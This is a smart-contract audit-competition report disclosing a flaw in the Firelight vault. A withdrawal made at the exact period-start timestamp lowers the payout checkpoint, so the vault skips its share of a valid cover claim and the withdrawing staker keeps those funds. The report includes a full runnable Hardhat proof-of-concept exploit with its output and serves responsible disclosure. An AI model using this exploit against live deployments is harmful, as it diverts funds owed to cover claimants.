# 88775 sc high inclusive period start checkpoint lets a boundary withdrawal escape slashing and underfund a fully collateralized cover claim

**Submitted on Aug 15th 2026 at 00:53:29 UTC by @Maroutis for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88775
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

Firelight's [withdrawal guide](https://docs.firelight.finance/for-stakers/deployments-and-withdrawals.md) says pending capital continues backing cover for the rest of the period in which unstaking begins: “the pending withdrawal takes the same pro-rata slash as active positions.” Redemption only “removes the position from the next period boundary's coverage-capacity calculation.”

At `T = periodStart(P)`, an ordinary withdrawal executes while `currentPeriod() == P` and is assigned to the `P+1` pending bucket, so it remains exposed to period-`P` incidents. The same transaction records the post-withdraw active balance at `T`, and Firelight's inclusive historical lookup uses that lower value as period `P`'s payout cap. Because the period-`P` book was created during `P-1` and still fits within the lower matching capacity, it can be committed in a later block and settle unchanged. The differential PoC settles 200 units of cover in both branches, but the boundary withdrawal erases the 100-unit vault payout leg. The incident closes after paying only 100, and the staker later claims the 100 that should have funded the loss.

## Vulnerability Details

### 1. Exact `T` records contradictory exposure

`createCoverOrder` targets `currentPeriod() + 1`, so every order eligible for period `P` was created during `P-1`:

```solidity
uint256 targetPeriod = _currentPeriod() + 1;
...
order.period = targetPeriod;
$.ordersIdByPeriod[targetPeriod].push(coverOrderId);
```

At exact `T = periodStart(P)`, `currentPeriod() == P`. `_requestWithdraw` therefore puts the withdrawal in the `P+1` bucket and the pending pool:

```solidity
uint256 period = currentPeriod() + 1;
withdrawAssets[period] += assets;
withdrawShares[period] += sharesWithdraw;
withdrawSharesOf[period][receiver] += sharesWithdraw;
pendingWithdrawAssets += assets;
```

The assets remain physically held by the vault, but `withdraw` records the reduced active balance under timestamp `T`:

```solidity
_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
uint48 ts = Time.timestamp();
...
_traceTotalAssets.push(ts, _totalAssets);
```

`Trace256.push` replaces the latest value when its key is also `T`, and `upperLookupRecent(T)` returns the latest key `<= T`. Consequently, `totalAssetsAt(T)` returns the post-withdraw balance `S-W`, not the `S` capital carried into `P`.

For a period-`P` incident, `payout` counts the `P+1` bucket as payable, then caps that payment by the reduced checkpoint:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];
...
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

The bucket says `W` remains exposed to period `P`, while the inclusive start cap excludes that same `W`. This contradicts both the source comment (“remain payable while payout is allowed”) and Firelight's published withdrawal rule.

### 2. The same book settles through ordinary later matching

The PoC creates a 200-unit period-`P` order during `P-1`. At `T`, the attack branch contains only the public 100-unit withdrawal and pins that state; the control mines an empty boundary block and pins its intact 100 active units. Both allocators then commit normally at `T+1`, with no allocator transaction in the boundary block.

The funded 100-unit FLB makes attack capacity `2 × (100 FLB + 0 active) = 200`; control capacity is `2 × (100 FLB + 100 active) = 400`. The pre-existing book fits both states, both roots allocate the same 200 cover, and both branches settle it at `T+2`.

The control requests the same withdrawal only after settlement, at `T+3`. Its commitment therefore used contemporaneous active capital, while both incidents still see 100 in the period-`P` payable bucket. This removes both a same-block allocator premise and the separate stale-capacity issue.

### 3. A valid, fully collateralized incident loses the vault leg

Settlement transfers the premium and mints the production `CoverNFT`. After settlement and withdrawal, the real `IncidentManager` confirms that the 200-unit loss is within allocated cover, checks that the order and incident periods match, and executes the production waterfall.

The loss is backed by exactly 100 funded and approved USDC in the FLB plus 100 FXRP physically held by the vault. The FLB pays 100 and exhausts its balance and allowance in both branches; the vault must pay the remaining 100:

* **Control:** `totalAssetsAt(T) = 100`; the vault pays 100; total payout is 200.
* **Attack:** `totalAssetsAt(T) = 0` even though `withdrawAssets[P+1] = 100` and the vault physically holds 100; the vault pays zero; total payout is only 100.

The approved incident is then marked `CLOSED`, with no second path for the missing 100. At maturity the attacker calls `claimWithdraw(P+1)` and receives all 100 FXRP.

### 4. Pinning the boundary state does not cure the contradiction

The first block at or after `T` may define matching capacity, but it cannot redefine this withdrawal as pre-`P`: it executed while `currentPeriod() == P`, was booked to `P+1`, remains held, and under Firelight's rules stays slashable through `P` before leaving capacity at `P+1`.

Using that transaction as pre-`P` for `totalAssetsAt(T)` but in-`P` for payout exposure and maturity is the bug. The control settles identical cover and pays the full 200, proving the differential is not intentional leverage, an invalid claim, or missing FLB funds or allowance.

## Impact Details

The differential test produces a **100-unit incremental unpaid claim** with no difference in settled cover, assessed loss, price, FLB funding, allowance, physical vault assets, or trusted-role behavior. Those 100 units are returned to the attacker after the incident closes.

More generally, let `S` be the slashable vault pool immediately before the boundary and `W` the exact-boundary withdrawal. For a vault-leg request of at least `S`, the intact control pays `S`, while the corrupted branch can pay only `S-W`; claimant underpayment is therefore `W`, provided the pre-existing book still fits within the post-withdraw matching and concentration limits.

For partial withdrawals, payout allocation is still pro-rata. A fully exiting attacker who owns `W` of a pool `S` retains approximately `W²/S`; the remainder of the missing `W` accrues to active stakers. If the withdrawing actor owns the entire pool, as in the maximal PoC, it ultimately retains all `W`. This distinction affects who captures the diverted value, not the cover claimant's `W` underpayment.

The incident is irrevocably closed after the partial payment. This is the in-scope Critical impact **Protocol insolvency**: valid, settled, fully collateralized cover is not honored because slashable assets are released to the withdrawing staker instead.

The live Phase-1 vault currently uses one-day periods. A read-only sample of periods 230 through 246 found a block at the exact mathematical boundary timestamp in 16 of 17 periods. The attack does not depend on consecutive blocks sharing a timestamp: the withdrawal must land at `T`, while the allocator is expected to observe that block and commit normally at `T+1` or later.

## References

* [`createCoverOrder` fixes the target book in the prior period](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L191-L248)
* [`withdraw` records the reduced active balance](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L755-L777)
* [`_requestWithdraw` assigns the next-period pending bucket](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L994-L1027)
* [`_logTrace` writes at the current second](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1044-L1055)
* [`Trace256` checkpoint insertion/replacement and inclusive lookup](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/lib/Checkpoints.sol#L193-L224)
* [`payout` start cap and exposed withdrawal buckets](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L892-L965)
* [`commitAllocation` and capacity validation](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L325-L403)
* [`IncidentManager` validates loss against settled cover and period](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L330-L368)
* [Firelight Deployments and Withdrawals](https://docs.firelight.finance/for-stakers/deployments-and-withdrawals.md)
* [Firelight Risk and Exposure](https://docs.firelight.finance/for-stakers/risk-and-exposure.md)
* [Firelight Claims Liquidation](https://docs.firelight.finance/protocol-architecture/claims-liquidation.md)

## Proof of Concept

Run from the repository root:

```bash
npx hardhat test poc/submissions/02_boundary_exposure_snapshot.js
```

The standalone test deploys the real `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`, plus separate six-decimal FXRP and USDC mocks and a fresh `$1` price feed. It then performs these steps in clean A/B branches:

{% stepper %}
{% step %}

## Deposit and fund the first-loss wallet

Deposit 100 FXRP and fund the first-loss wallet with 100 USDC plus an exact 100-USDC allowance to IncidentManager.
{% endstep %}

{% step %}

## Create the period-`P` order

During `P-1`, create a 200-unit order for period `P` from a buyer separate from the withdrawing staker.
{% endstep %}

{% step %}

## Pin the boundary state

Attack branch: withdraw 100 in the first period-`P` block at exact `T`. Control: mine an empty first period-`P` block at `T`, leaving all 100 vault units active.
{% endstep %}

{% step %}

## Commit allocation

In both branches, commit normally at `T+1` from the exact pinned/live state, using capacities 200 and 400 respectively.
{% endstep %}

{% step %}

## Settle the identical order

Settle the identical 200-unit order in both branches at `T+2`, transfer the premium, and mint the CoverNFT.
{% endstep %}

{% step %}

## Request the control withdrawal and capture the incident

In the control only, request the 100-unit withdrawal after settlement at `T+3`. Then capture the incident strictly after settlement and withdrawal (`T+3` attack, `T+4` control), and create, confirm, assess, submit, and approve a loss equal to the allocated 200 cover.
{% endstep %}

{% step %}

## Verify the payout differential

Verify the FLB pays 100 in both branches. The control vault pays the remaining 100; the attacked vault pays zero and closes the incident.
{% endstep %}

{% step %}

## Claim the escaped withdrawal

Advance through maturity and verify the attacker directly claims the 100 that escaped the incident.
{% endstep %}

{% step %}

## Assert the result

Assert identical settled cover and a 100-unit differential in payout.
{% endstep %}
{% endstepper %}

### Full runnable test code

The executed test is included below.

<details>

<summary><code>poc/submissions/02_boundary_exposure_snapshot.js</code></summary>

```javascript
/*
 * A public period-boundary withdrawal changes the
 * payout checkpoint even when the allocator commits normally in a later block.
 *
 * Run from the repository root:
 *   npx hardhat test poc/submissions/02_boundary_exposure_snapshot.js
 */
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('../../test/setup/fixtures.js')
const { expect } = require('chai')
const { ethers, network, upgrades } = require('hardhat')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')

const E6 = 10n ** 6n
const E18 = 10n ** 18n
const M = (n) => BigInt(n) * E6
const C = (n) => BigInt(n) * E18

const MARKET = {
  chainId: 1,
  protocol: 'BoundaryProtocol',
  market: ethers.encodeBytes32String('market-A')
}

const marketId = () => ethers.keccak256(
  ethers.AbiCoder.defaultAbiCoder().encode(
    ['uint64', 'string', 'bytes32'],
    [MARKET.chainId, MARKET.protocol, MARKET.market]
  )
)

const buildTree = (id, cover) => StandardMerkleTree.of(
  [[id, [[marketId(), cover]]]],
  ['uint256', '(bytes32,uint256)[]']
)

const randomSigner = async () => {
  const wallet = ethers.Wallet.createRandom().connect(ethers.provider)
  await ethers.provider.send('hardhat_setBalance', [wallet.address, '0x3635C9ADC5DEA00000'])
  return wallet
}

async function deployRealStack() {
  const ctx = await deployVault({
    decimals: 6,
    initial_deposit_limit: M(10_000_000).toString()
  })
  const {
    deployer,
    rescuer: allocatorRole,
    blocklister: configAdmin,
    pauser: assessmentApprover,
    period_configuration_updater: curator,
    firelight_vault: vault,
    token_contract: asset
  } = ctx

  const adminRole = await randomSigner()
  const premiumCollector = await randomSigner()
  const firstLossBuffer = await randomSigner()
  const buyer = await randomSigner()

  // Production-faithful 6-decimal USD stablecoin used for premiums and FLB.
  // The vault asset remains the separate 6-decimal FXRP mock valued at $1.
  const MockERC20 = await ethers.getContractFactory('MockERC20')
  const usdc = await MockERC20.connect(deployer).deploy('MockUSDC', 'mUSDC', 6)

  const CoverNFT = await ethers.getContractFactory('CoverNFT')
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    [
      'Firelight Cover',
      'FLCOVER',
      '',
      deployer.address,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ethers.ZeroAddress
    ],
    { kind: 'transparent' }
  )

  const MockAggregator = await ethers.getContractFactory('MockAggregatorV3')
  const priceFeed = await MockAggregator.deploy(18, E18)

  const CoverOrderAllocator = await ethers.getContractFactory('CoverOrderAllocator')
  const allocator = await upgrades.deployProxy(
    CoverOrderAllocator,
    [{
      vault: vault.target,
      premiumCollector: premiumCollector.address,
      coverNFT: coverNFT.target,
      priceFeedAdapter: priceFeed.target,
      maxPriceAge: 2 * ctx.config.period_configuration_duration,
      premiumTokens: [usdc.target],
      admin: deployer.address,
      adminRole: adminRole.address,
      curatorRole: curator.address,
      allocatorRole: allocatorRole.address,
      configAdminRole: configAdmin.address,
      initialProtocolConcentrations: [{
        chainId: MARKET.chainId,
        protocol: MARKET.protocol,
        maxProtocolConcentrationBps: 10_000
      }],
      newMarkets: [MARKET],
      capacityConfig: {
        minCAR: 12_000,
        firstLossBufferToken: usdc.target,
        firstLossBuffer: firstLossBuffer.address,
        // At 2x leverage the 200-unit book fits both branches: capacity is
        // 400 in the control and exactly 200 after the boundary withdrawal.
        effectiveLeverage: 24_000,
        minOrderMarketCoverAmount: 1,
        divergenceToleranceBps: 0
      }
    }],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] }
  )

  await coverNFT.connect(deployer).grantRole(await coverNFT.MINTER_ROLE(), allocator.target)

  const IncidentManager = await ethers.getContractFactory('IncidentManager')
  const incidentManager = await upgrades.deployProxy(
    IncidentManager,
    [
      deployer.address,
      curator.address,
      assessmentApprover.address,
      configAdmin.address,
      ctx.incident.address,
      configAdmin.address,
      deployer.address,
      deployer.address,
      ctx.payout_receiver.address,
      allocator.target,
      priceFeed.target,
      2 * ctx.config.period_configuration_duration
    ],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] }
  )

  await vault.connect(deployer).grantRole(await vault.PAYOUT_ROLE(), incidentManager.target)
  await vault.connect(deployer).grantRole(await vault.INCIDENT_ROLE(), incidentManager.target)

  // The same fully funded and fully approved 100-unit FLB backs both branches.
  // It contributes to matching capacity and later pays the first 100 of loss
  // through the production IncidentManager waterfall.
  await usdc.mint(firstLossBuffer.address, M(100))
  await usdc.connect(firstLossBuffer).approve(incidentManager.target, M(100))

  return {
    ...ctx,
    allocator,
    coverNFT,
    priceFeed,
    incidentManager,
    allocatorRole,
    curator,
    assessmentApprover,
    buyer,
    firstLossBuffer,
    usdc
  }
}

async function run(withdrawOffset) {
  const s = await loadFixture(deployRealStack)
  const vault = s.firelight_vault
  const asset = s.token_contract
  const attacker = s.users[0]
  const cover = C(200)
  const withdrawn = M(100)

  // The attacker owns all vault capital. The cover buyer is a separate EOA.
  await s.utils.mintAndApprove(M(100), attacker)
  await vault.connect(attacker).deposit(M(100), attacker.address)

  // createCoverOrder always targets P=currentPeriod()+1. Thus this period-P
  // book is fixed before its boundary timestamp T exists on chain.
  await s.allocator.connect(s.curator).createCoverOrder(
    s.buyer.address,
    s.buyer.address,
    'beneficiary',
    s.usdc.target,
    [{ marketId: marketId(), coverRateAnnual: 500, coverAmount: cover }],
    0
  )
  const orderBefore = await s.allocator.getCoverOrder(0)
  const premiumNative = (orderBefore.totalPremiumAmount + 10n ** 12n - 1n) / 10n ** 12n
  await s.usdc.mint(s.buyer.address, premiumNative)
  await s.usdc.connect(s.buyer).approve(s.allocator.target, premiumNative)

  const T = await vault.currentPeriodEnd()
  const targetPeriod = await vault.currentPeriod() + 1n

  const isAttack = withdrawOffset === 0
  let pinnedBoundaryBlock
  let withdrawReceipt

  if (isAttack) {
    // The attack's first block of P contains only the public withdrawal. The
    // runner pins its post-withdraw state at T; no allocator call is pre-queued.
    await time.setNextBlockTimestamp(T)
    withdrawReceipt = await (
      await vault.connect(attacker).withdraw(withdrawn, attacker.address, attacker.address)
    ).wait()
    pinnedBoundaryBlock = await ethers.provider.getBlock(withdrawReceipt.blockNumber)
  } else {
    // The control's first block of P is empty. The runner pins the intact
    // 100-vault + 100-FLB state before either matching or withdrawal occurs.
    await time.setNextBlockTimestamp(T)
    await network.provider.send('evm_mine')
    pinnedBoundaryBlock = await ethers.provider.getBlock('latest')
  }

  expect(pinnedBoundaryBlock.timestamp).to.equal(Number(T))
  expect(await vault.currentPeriod()).to.equal(targetPeriod)
  expect(await vault.currentPeriodStart()).to.equal(T)

  const snapshot = await vault.totalAssetsAt(T)
  const expectedSnapshot = isAttack ? 0n : M(100)
  expect(snapshot).to.equal(expectedSnapshot)
  expect(await vault.totalAssets()).to.equal(isAttack ? 0n : M(100))
  expect(await vault.withdrawAssets(targetPeriod + 1n)).to.equal(isAttack ? withdrawn : 0n)

  // In both branches the runner submits at T+1 using the exact state it pinned
  // at T. The attack's live 100-FLB collateral yields capacity 200; the
  // control's live 100-vault + 100-FLB collateral yields capacity 400.
  const commitTimestamp = T + 1n
  const capacity = (expectedSnapshot + M(100)) * 10n ** 12n * 2n
  const tree = buildTree(0n, cover)
  await time.setNextBlockTimestamp(commitTimestamp)
  const commitReceipt = await (
    await s.allocator.connect(s.allocatorRole).commitAllocation(
      targetPeriod,
      tree.root,
      cover,
      capacity
    )
  ).wait()

  const commitBlock = await ethers.provider.getBlock(commitReceipt.blockNumber)
  expect(commitReceipt.blockNumber).to.be.greaterThan(pinnedBoundaryBlock.number)
  expect(commitBlock.timestamp).to.be.greaterThan(pinnedBoundaryBlock.timestamp)
  expect(commitBlock.timestamp).to.equal(Number(commitTimestamp))
  expect(await vault.totalAssets()).to.equal(isAttack ? 0n : M(100))

  const commitment = await s.allocator.getAllocationCommitment(targetPeriod)
  expect(commitment.totalAvailableCapacity).to.equal(capacity)
  expect(commitment.totalDeclaredAllocated).to.equal(cover)
  expect(cover).to.be.lessThanOrEqual(capacity)

  await time.setNextBlockTimestamp(T + 2n)
  const settlementReceipt = await (
    await s.allocator.connect(s.allocatorRole).settleCoverOrder(
      0,
      [{ marketId: marketId(), allocatedCover: cover }],
      tree.getProof(0)
    )
  ).wait()
  const settledOrder = await s.allocator.getCoverOrder(0)
  expect(settledOrder.allocatedCoverAmount).to.equal(cover)
  expect(await s.coverNFT.ownerOf(0)).to.equal(s.buyer.address)

  const settlementBlock = await ethers.provider.getBlock(settlementReceipt.blockNumber)
  expect(settlementBlock.timestamp).to.equal(Number(T + 2n))

  if (!isAttack) {
    // Only after the control commitment and settlement does the same public
    // withdrawal execute. The commitment was therefore not accepted against a
    // stale post-withdraw live balance (the separate C-3 mechanism).
    await time.setNextBlockTimestamp(T + 3n)
    withdrawReceipt = await (
      await vault.connect(attacker).withdraw(withdrawn, attacker.address, attacker.address)
    ).wait()
  }

  const withdrawBlock = await ethers.provider.getBlock(withdrawReceipt.blockNumber)
  if (isAttack) {
    expect(withdrawBlock.number).to.equal(pinnedBoundaryBlock.number)
    expect(withdrawBlock.timestamp).to.equal(Number(T))
    expect(withdrawBlock.number).to.be.lessThan(commitReceipt.blockNumber)
  } else {
    expect(withdrawBlock.timestamp).to.equal(Number(T + 3n))
    expect(withdrawBlock.number).to.be.greaterThan(settlementReceipt.blockNumber)
  }

  expect(await vault.totalAssets()).to.equal(0n)
  expect(await vault.withdrawAssets(targetPeriod + 1n)).to.equal(withdrawn)
  expect(await vault.totalAssetsAt(T)).to.equal(expectedSnapshot)

  // Exercise the production assessment path. Capture occurs after both cover
  // settlement and withdrawal, while remaining in P.
  // FirelightVault therefore resolves the capture-period start back to T.
  const captureTimestamp = BigInt(Math.max(settlementBlock.timestamp, withdrawBlock.timestamp)) + 1n
  await time.setNextBlockTimestamp(captureTimestamp)
  await s.incidentManager.connect(s.curator).createIncident(
    captureTimestamp,
    'Boundary checkpoint incident',
    ethers.keccak256(ethers.toUtf8Bytes(`c2-${withdrawOffset}`))
  )
  await s.incidentManager.connect(s.curator).confirmIncident(1, 'ipfs://c2')
  await s.incidentManager.connect(s.curator).addAssessmentLosses(
    1,
    [{ coverTokenId: 0n, marketId: marketId(), amount: cover }]
  )
  await s.incidentManager.connect(s.curator).submitCurrentAssessment(1)

  expect(await asset.balanceOf(vault.target)).to.equal(M(100))
  expect(await s.usdc.balanceOf(s.firstLossBuffer.address)).to.equal(M(100))
  expect(await s.usdc.allowance(s.firstLossBuffer.address, s.incidentManager.target)).to.equal(M(100))

  const receiverVaultAssetBefore = await asset.balanceOf(s.payout_receiver.address)
  const receiverFlbBefore = await s.usdc.balanceOf(s.payout_receiver.address)
  await s.incidentManager.connect(s.assessmentApprover).approveCurrentAssessment(1)
  const receiverVaultAssetAfter = await asset.balanceOf(s.payout_receiver.address)
  const receiverFlbAfter = await s.usdc.balanceOf(s.payout_receiver.address)
  const vaultPaid = receiverVaultAssetAfter - receiverVaultAssetBefore
  const flbPaid = receiverFlbAfter - receiverFlbBefore
  // Both tokens have 6 decimals and the price feed fixes FXRP at $1, so their
  // sum is the paid USD value in the same native precision.
  const totalPaid = flbPaid + vaultPaid

  const [incident] = await s.incidentManager.getIncident(1)
  const [assessment] = await s.incidentManager.getAssessmentRound(1, 1)
  expect(incident.status).to.equal(4) // CLOSED
  expect(assessment.status).to.equal(3) // APPROVED
  expect(assessment.totalAssessmentLoss).to.equal(cover)
  expect(incident.vaultPaidAmount).to.equal(vaultPaid)
  expect(flbPaid).to.equal(M(100))
  expect(await s.usdc.balanceOf(s.firstLossBuffer.address)).to.equal(0n)
  expect(await s.usdc.allowance(s.firstLossBuffer.address, s.incidentManager.target)).to.equal(0n)

  let retained = 0n
  if (withdrawOffset === 0) {
    // The FLB pays its 100-unit leg, but totalAssetsAt(T)==0 suppresses the
    // vault's entire 100-unit leg even though that exact amount remains in the
    // exposed withdrawal bucket. The attacker claims it directly at maturity.
    expect(totalPaid).to.equal(M(100))
    expect(vaultPaid).to.equal(0n)
    expect(await vault.withdrawAssets(targetPeriod + 1n)).to.equal(withdrawn)
    expect(await vault.totalAssets()).to.equal(0n)

    await time.increase(2 * s.config.period_configuration_duration)
    const balanceBeforeClaim = await asset.balanceOf(attacker.address)
    await vault.connect(attacker).claimWithdraw(targetPeriod + 1n)
    retained = (await asset.balanceOf(attacker.address)) - balanceBeforeClaim
    expect(retained).to.equal(withdrawn)
  } else {
    // The identical FLB leg pays 100 and the intact T snapshot lets the vault
    // pay the remaining 100, exhausting the fully collateralized 200 loss.
    expect(totalPaid).to.equal(M(200))
    expect(vaultPaid).to.equal(M(100))
    expect(await vault.withdrawAssets(targetPeriod + 1n)).to.equal(0n)
    expect(await vault.totalAssets()).to.equal(0n)
  }

  return {
    cover,
    capacity,
    snapshot,
    totalPaid,
    vaultPaid,
    flbPaid,
    retained,
    pinnedBoundaryBlock: pinnedBoundaryBlock.number,
    pinnedBoundaryTimestamp: pinnedBoundaryBlock.timestamp,
    withdrawalBlock: withdrawReceipt.blockNumber,
    withdrawalTimestamp: withdrawBlock.timestamp,
    commitBlock: commitReceipt.blockNumber,
    commitTimestamp: commitBlock.timestamp,
    settlementBlock: settlementReceipt.blockNumber,
    settlementTimestamp: settlementBlock.timestamp,
    captureTimestamp: Number(captureTimestamp)
  }
}

describe('Revised C-2  Boundary withdrawal under an ordinary later allocator commit', () => {
  it('settles identical fully collateralized cover but erases the vault payout leg', async () => {
    const control = await run(1)
    const attack = await run(0)

    expect(attack.cover).to.equal(control.cover)
    expect(attack.flbPaid).to.equal(M(100))
    expect(control.flbPaid).to.equal(M(100))
    expect(attack.vaultPaid).to.equal(0n)
    expect(control.vaultPaid).to.equal(M(100))
    expect(control.totalPaid - attack.totalPaid).to.equal(M(100))
    expect(attack.retained).to.equal(M(100))

    console.log(
      `    control: pinTs=${control.pinnedBoundaryTimestamp} commitTs=${control.commitTimestamp} ` +
      `settleTs=${control.settlementTimestamp} withdrawTs=${control.withdrawalTimestamp} ` +
      `captureTs=${control.captureTimestamp} ` +
      `capacity=${control.capacity / E18} settled=${control.cover / E18} ` +
      `flbPaid=${control.flbPaid / E6} vaultPaid=${control.vaultPaid / E6} totalPaid=${control.totalPaid / E6}`
    )
    console.log(
      `    attack: pinTs=${attack.pinnedBoundaryTimestamp} withdrawTs=${attack.withdrawalTimestamp} ` +
      `commitTs=${attack.commitTimestamp} settleTs=${attack.settlementTimestamp} ` +
      `captureTs=${attack.captureTimestamp} ` +
      `capacity=${attack.capacity / E18} settled=${attack.cover / E18} ` +
      `flbPaid=${attack.flbPaid / E6} vaultPaid=${attack.vaultPaid / E6} totalPaid=${attack.totalPaid / E6} ` +
      `attackerClaimed=${attack.retained / E6}`
    )
    console.log(
      `    defect delta: identicalCover=${attack.cover / E18} ` +
      `incrementalUnderpayment=${(control.totalPaid - attack.totalPaid) / E6}`
    )
  })
})
```

</details>

### Actual output

```
  Revised C-2  Boundary withdrawal under an ordinary later allocator commit
    control: pinTs=1787355279 commitTs=1787355280 settleTs=1787355281 withdrawTs=1787355282 captureTs=1787355283 capacity=400 settled=200 flbPaid=100 vaultPaid=100 totalPaid=200
    attack: pinTs=1787355279 withdrawTs=1787355279 commitTs=1787355280 settleTs=1787355281 captureTs=1787355282 capacity=200 settled=200 flbPaid=100 vaultPaid=0 totalPaid=100 attackerClaimed=100
    defect delta: identicalCover=200 incrementalUnderpayment=100
    ✔ settles identical fully collateralized cover but erases the vault payout leg (1418ms)


  1 passing (1s)
```
